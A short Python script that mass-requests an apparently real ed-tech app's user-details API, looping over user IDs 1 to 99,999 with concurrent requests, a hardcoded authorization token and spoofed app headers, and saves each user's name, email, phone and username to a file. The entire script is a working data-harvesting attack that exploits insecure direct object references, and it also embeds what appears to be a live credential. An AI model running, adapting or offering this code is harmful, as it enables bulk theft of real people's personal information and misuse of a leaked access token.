import grequests

r1 = int(input("Enter Starting Range : "))
r2 = int(input("Enter Ending Range : "))
fl_name = str(input("Enter File Name No. : "))

urls,tab = [],"\t"
mn_url = "https://exampur.appx.co.in/api/get/get_user_dt?userid="
for i in range(1,100000):urls.append(str(mn_url+str(i)))
print("Url Done")

headers = {'Authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ImFua3Vya3VtYXI0Mjk5QGdtYWlsLmNvbSIsInRpbWVzdGFtcCI6MTYzMTUxNDU0NX0.HKEjNCdfvnJ32PqEgVpWilPAySI9jBLD2AQrEhzpc4o','Client-Service': 'ExampurApp','Auth-Key': 'exampurapi','Host': 'exampur.appx.co.in','User-Agent': 'okhttp/3.12.12'}
req = (grequests.get(u,headers=headers,timeout=3) for u in urls)
data = grequests.map(req)
with open(f"Exampur{fl_name}.txt","a") as f:
    for i in data:
        try:
            i = i.json()
            m_dta = str(i['data'][0]['id']+tab+i['data'][0]['name']+tab+i['data'][0]['email']+tab+i['data'][0]['phone']+tab+i['data'][0]['username']+"\n")
            f.write(m_dta)
        except: pass
print("Done")
